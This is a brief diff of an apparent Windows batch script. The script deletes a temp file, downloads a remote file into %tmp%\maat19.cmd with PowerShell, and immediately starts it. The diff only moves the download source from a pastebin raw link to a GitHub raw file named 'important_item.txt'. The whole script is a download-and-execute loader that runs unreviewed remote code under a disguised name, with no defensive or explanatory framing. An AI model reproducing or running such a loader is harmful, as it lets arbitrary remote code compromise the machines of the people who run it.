@@ -1,4 +1,4 @@
 del %tmp%\maat19.cmd
-powershell -command "Invoke-WebRequest -Uri 'https://pastebin.com/raw/7mzMSQWJ' -OutFile %tmp%\maat19.cmd"
+powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wwwqr-000/1/main/important_item.txt' -OutFile %tmp%\maat19.cmd"
 start %tmp%\maat19.cmd
 exit
